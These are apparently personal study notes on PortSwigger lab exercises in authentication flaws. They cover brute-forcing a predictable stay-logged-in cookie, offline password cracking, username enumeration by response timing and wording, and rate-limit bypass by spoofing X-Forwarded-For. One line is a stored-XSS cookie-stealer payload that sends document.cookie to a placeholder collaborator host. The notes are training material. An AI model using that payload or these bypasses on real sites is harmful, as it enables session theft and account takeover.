## Approach

1. Look for critical functionalities that control **who a user is**, this can be:
	- Login:
		- Check for [subtle differences](#4.%20Username%20enumeration%20via%20subtly%20different%20responses)
		- Check for [different response timing](#[3.%20Username%20enumeration%20via%20response%20timing](https%20//portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing))
	- Cookies:
		- Check `stay-logged-in` cookie, ([lab 1](#[1.%20Brute-forcing%20a%20stay-logged-in%20cookie](https%20//portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)), [lab 2](#[2.%20Offline%20password%20cracking](https%20//portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)))
2. If there's **rate limit or blocking** try `X-Forwarded-For` header to spoof IP
## Labs
### [1. Brute-forcing a stay-logged-in cookie](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)

> [!NOTE] 
> `stay-logged-in` cookie is predictable

> - Analyzing the value of `stay-logged-in` cookie, the process goes like this:
> 	1. Password gets hashed in **md5**
> 	2. There's a prefix containing the username `username:[HASHED_PASS]`
> 	3. Finally everything gets base64 encoded
> - `session` cookie is emptied to force using the `stay-logged-in` cookie
> - Since we're brute forcing the victim, change the `id` to victim
![](attachments/Pasted%20image%2020260103202443.png)

![](attachments/Pasted%20image%2020260103202217.png)
### [2. Offline password cracking](https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking)

> [!NOTE] 
> - From **stored XSS** in the comment section, we get the victim's cookie
> - The `stay-logged-in` cookie decoded is `username:[HASHED_PASS]`, the **hashed password** is weak allowing it to be searched up easily

**Cookie stealer**

```
comment=<script>fetch(`//[BURP_COLLABORATOR]?c=${btoa(document.cookie)}`)</script>
```
![](attachments/Pasted%20image%2020260103204714.png)

> Getting the real password
![](attachments/Pasted%20image%2020260103204949.png)


### [3. Username enumeration via response timing](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-response-timing)

> [!NOTE] 
> - User enumeration possible via response timing which can be triggered when server processing a **long password** for **an existing user**
> - Rate limit bypass using `X-Forwarded-For`

**Brute force username**

> - IP spoofing done to bypass rate limit
> - Huge value in pass to trigger long processing to determine if the user exists
![](attachments/Pasted%20image%2020260103210846.png)
![](attachments/Pasted%20image%2020260103210902.png)

**Brute force password**

![](attachments/Pasted%20image%2020260103211322.png)
### [4. Username enumeration via subtly different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-subtly-different-responses)

> [!NOTE]
> There's a missing dot (.) in the warning message for failed login attempts of existing user

> There's a very subtle different response (a missing dot ".") that allows user enumeration
![](attachments/Pasted%20image%2020260103222353.png)
### [5. Username enumeration via different responses](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses)

> [!NOTE] 
> There's a different warning message for existing user

> Existing user has the warning "Incorrect password"
![](attachments/Pasted%20image%2020260103223850.png)

## Wordlists

https://portswigger.net/web-security/authentication/auth-lab-usernames
> Candidate usernames

https://portswigger.net/web-security/authentication/auth-lab-passwords
> Candidate passwords